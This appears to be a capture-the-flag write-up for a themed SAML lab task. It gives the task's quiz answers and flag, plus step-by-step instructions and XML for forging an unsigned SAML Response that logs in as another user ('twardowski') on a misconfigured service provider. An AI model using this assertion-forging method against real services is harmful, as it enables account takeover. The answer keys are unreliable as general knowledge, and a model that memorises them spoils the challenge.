[🢁](../README.md) &nbsp;
[🢀](../6%20Boruta/README.md) &nbsp;Task 7&nbsp;
[🢂](../8%20Popiel/README.md)

# Twardowski

**☆ Twardowski (Alchemist) ☆**

>Twardowski is a master of alchemy and uses his knowledge to create potions and elixirs that aid in the search for the fern flower. He is constantly experimenting with different ingredients and formulas to unlock the secrets of the flower's power. Twardowski's work is crucial to the company's mission, as his potions can provide the team with enhanced strength, speed, and intelligence.

# Description

Twardowski is brilliant but also a little bit eccentric man. What can you expect from a guy interested in alchemy and mysticism? He was hired by Midsummer Corp also because of his deep knowledge and expertise in IT. Especially when it comes to providing single sign-on experience with SAML. You see? A true renaissance man. He was given the task of implementing Single Sign-On in Midsummer Corp's application. Unfortunately, he disappeared under mysterious circumstances. Before he vanished, he managed to send a short message to Boruta explaining what had to be done in order to finish SSO implementation. But what actually is SAML and how is this whole thing supposed to work? 

**What is SAML?**

SAML (Security Assertion Markup Language) is a standard protocol used for exchanging authentication and authorization data between usually three parties: a user, an identity provider (IdP) and a service provider (SP). It may be one of the answers to the question "How can I let users log in once and access multiple applications without having to enter their credentials each time?". Let's say you want to access a cloud-based application. You visit its home page, go to login form and select the option to sign in with an identity provider. After this, the application forwards you to an IdP where you have to provide your credentials. IdP authenticates you and creates an SAML assertion (a document containing information about you, like first name, last name, email, etc.). This assertion is digitally signed by the IdP to ensure its integrity and sent back to your application. Now the application, as a service provider, validates the signature, retrieves information contained in the assertion, and grants you access to the application. 

Unfortunately, you will not be able to go through the whole flow like this with the Midsummer Corp app. Twardowski managed to configure SSO in Midsummer app, but broke IdP before he vanished. Still, you need to access his account which can be done only through SSO. Do you have an idea how to achieve this? Boruta was supposed to clean Twardowski's mess, so maybe he will know something? 

**Useful resources**

[SAML - what can go wrong? Security check](https://www.securing.pl/en/saml-what-can-go-wrong-security-check/)

[SAML Security - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html)


# Tasks

**Prerequisites**: Access to boruta account. 

**Your objective**: Find a way to log in to the twardowski account. 

## 1. What is the name of the XML entity that contains information about user such as their name, email, roles, etc.?

Answer format: `*********`

Answer: `assertion`

Answer in task description

```IdP authenticates you and creates an SAML assertion (a document containing information about you, like first name, last name, email, etc.)```

## 2. What is the name of a party that authenticates users and issues SAML assertions?

Answer format: `******** ********`

Answer: `Identity Provider`

Answer in task description

```...IdP authenticates you and creates an SAML assertion...```

## 3. What is the date on the document scan from Twardowski's account in DD/MM/YYYY format?

Answer format: `**/**/****`

Answer: `15/06/2023`


## 4. What should be the value of Content-Type header when sending the SAML Response?

Answer format: `***********/*********************`

Answer: `application/x-www-form-urlencoded`

Quick google search for `saml response content type` or for example POST request to send tells us, that it's `application/x-www-form-urlencoded`

## 5. What should be Destination set to in SAML Response?

Answer format: `****://*****.*********.****.*****/****/*********/****/***`

Answer: `http://files.midsummer.corp.local/apps/user_saml/saml/acs`

Prerequisity of Boruta account access sugests to look there. For this task we will need [twardowski_sso_config.msg.txt](./twardowski_sso_config.msg.txt) file. Twardowski says to Boruta:

``` You can send POST request to the Service Provider (SP) to "/apps/user_saml/saml/acs" endpoint to test if it's working.```

For the first part of address we need to take `files.midsummer.corp.local` from [Task 2](../2%20Midsummer%20Corp/README.md)


## 6. What should be Issuer set to in SAML Response?

Answer format: `****://***.*********.****`

Answer: `http://idp.midsummer.corp`

Looking at address length and the same file as in step before there is only one possible address to try and it's a correct answer

## 7. What is the content of the Fern_flower_ritual_shard5.txt file in Twardowski's account?

Answer format: `**************{************************************}`

Answer: `Midsummer_Corp{Look_f0r_th3_fern_w1th_silv3r_l3av3s}`

From [twardowski_sso_config.msg.txt](./twardowski_sso_config.msg.txt) file we know, that we have to craft SAML Response. From previous steps we know, that issuer will be `http://idp.midsummer.corp` and destination will be `http://files.midsummer.corp.local/apps/user_saml/saml/acs`, but instead of `files.midsummer.corp.local` we shoud use `MACHINE_IP`. This might be not obvious, but we can find out using metadata - explained later in [Wrong paths](#wrong-paths).

To make our own SAML Response we need to know how it looks. I used [this](https://www.samltool.com/generic_sso_res.php) site to get example response. We need to change issuer in two places from `http://idp.example.com/metadata.php` to `http://idp.midsummer.corp` and `http://sp.example.com/demo1/index.php?acs` to `http://MACHINE_IP/apps/user_saml/saml/acs` in two places (destination and recipent). 

[twardowski_sso_config.msg.txt](./twardowski_sso_config.msg.txt) file says, that `Application is matching "alias" with username and "role" attribute with group membership. I have restricted SSO usage to "sso" group until the configuration is finished and currenlty only my account is in this group.`, so atribute statements should be changed from:

```xml
<saml:AttributeStatement>
    <saml:Attribute Name="uid" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
    <saml:AttributeValue xsi:type="xs:string">test</saml:AttributeValue>
    </saml:Attribute>
    <saml:Attribute Name="mail" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
    <saml:AttributeValue xsi:type="xs:string">test@example.com</saml:AttributeValue>
    </saml:Attribute>
    <saml:Attribute Name="eduPersonAffiliation" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
    <saml:AttributeValue xsi:type="xs:string">users</saml:AttributeValue>
    <saml:AttributeValue xsi:type="xs:string">examplerole1</saml:AttributeValue>
    </saml:Attribute>
</saml:AttributeStatement>
```

To:

```xml
<saml:AttributeStatement>
    <saml:Attribute Name="alias" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
    <saml:AttributeValue xsi:type="xs:string">twardowski</saml:AttributeValue>
    </saml:Attribute>
    <saml:Attribute Name="role" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
    <saml:AttributeValue xsi:type="xs:string">sso</saml:AttributeValue>
    </saml:Attribute>
</saml:AttributeStatement>
```

Before response is sent under `SAMLResponse` key it needs to be encoded in base64. I used [base64encode.org](https://www.base64encode.org/) for it. Previous user needs to be logged, so we can do it via website or clear all cookies. Unfortunately it's not enough and we get following error:

```
Account not provisioned.
Your account is not provisioned, access to this service is thus not possible.
```

This took me more time to figure out. After searching for `/metadata` endpoint I found `/apps/user_saml/saml/metadata` and replaced both `http://sp.example.com/demo1/metadata.php` in `SPNameQualifier` and `audience` to `http://MACHINE_IP/apps/user_saml/saml/metadata`. Final response can be found in [SAMLResponse.xml](./SAMLResponse.xml). 

This finally got rid of not provisioned error and returned cookies for session and token. Cookie `nc_username` is set to `twardowski`, so we know that we are logged in. After copying and pasting cookies to browser we are logged in and have access to flag.

## Wrong paths

**All actions described in this section were not needed but gave me some ideas on what to do.**

Clicking `Login with SSO and SAML` on home page redirects us to unreachable site with following url:

```http://idp.midsummer.corp:5000/saml?SAMLRequest=jZLbTsMwDIbvkXgH1Pu1abt1EG2TBuMwaWzTNrjgBmWJyyK1SYhTDm9P2pWjBMLyle3vt%2F8oA2RlYei4cju1gscK0B0eHPl4KQuFtOkOg8oqqhlKpIqVgNRxuh5fz2gSEmqsdprrIvjJ%2FY0xRLBOatVy08kwWMzPZ4vL6fyeJxkXx1l6QrbdPCVJPxdMQAJ5n3dFnnLCsm0qWN6yt2DRKw0DL%2BxLrSBiBVOFjinnOyRJOyTrxOkmTmkv8XnX0hPvWSrmGoWdc4ZGkRQmLKXAqizBhlxbQ3uEkKj21WLL1vepVEKqh7%2FdbvdDSK82m2VnuVhvWpXx%2BzOcaeW3gV2DfZIcblazj2NiEtaZpWGWRcwYjCoP3de3NAdFjGMw2usN6gJtvNvRf%2FkSHBPMsUH0lf4iaOjcW5pOlrqQ%2FHXfqONC25K5363HYdxUpOjkzSitFBrgMpcggk%2BdcVHo5zMLzMEwcLaC4Cjy%2B%2Ff3fP%2Bdozc%3D&RelayState=http%3A%2F%2F10.10.163.66%2Fapps%2Ffiles%2F%3Fdir%3D%2F%26fileid%3D190```

I used [SAML Decoder](https://developer.pingidentity.com/en/tools/saml-decoder.html) to access its content:

```xml
<samlp:AuthnRequest
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="ONELOGIN_c26cd86390b4f3027fdade2ef7c4df3c0a6b3daf"
    Version="2.0"

    IssueInstant="2023-06-13T13:52:52Z"
    Destination="http://idp.midsummer.corp:5000/saml"
    ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
    AssertionConsumerServiceURL="http://10.10.163.66/apps/user_saml/saml/acs">
    <saml:Issuer>http://10.10.163.66/apps/user_saml/saml/metadata</saml:Issuer>
    <samlp:NameIDPolicy
        Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified"
        AllowCreate="true" />
</samlp:AuthnRequest>
```

This gave me a few ideas.

`ID="ONELOGIN_c26cd86390b4f3027fdade2ef7c4df3c0a6b3daf"` has the same format as `InResponseTo="ONELOGIN_4fee3b046395c4e751011e97f8900b5273d56685"` on response example so I changed it

I also set `IssueInstant="2023-06-13T13:52:52Z"` in case it's important.

As mentioned at the beggining of [Step 7](#7-what-is-the-content-of-the-fern_flower_ritual_shard5txt-file-in-twardowskis-account), issuer needs to be `http://MACHINE_IP/apps/user_saml/saml/metadata`, and not `http://files.midsummer.corp.local/apps/user_saml/saml/acs`.

Opening `http://MACHINE_IP/apps/user_saml/saml/metadata` downloads `metadata.xml` with following content:

```xml
<?xml version="1.0"?>
<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata"
                     validUntil="2023-06-15T14:37:53Z"
                     cacheDuration="PT604800S"
                     entityID="http://10.10.163.66/apps/user_saml/saml/metadata">
    <md:SPSSODescriptor AuthnRequestsSigned="false" WantAssertionsSigned="false" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
        <md:NameIDFormat>urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified</md:NameIDFormat>
        <md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
                                     Location="http://10.10.163.66/apps/user_saml/saml/acs"
                                     index="1" />
        
    </md:SPSSODescriptor>
</md:EntityDescriptor>
```

`AuthnRequestsSigned="false"` and `WantAssertionsSigned="false"` reassured me, that response example without anything signed should work.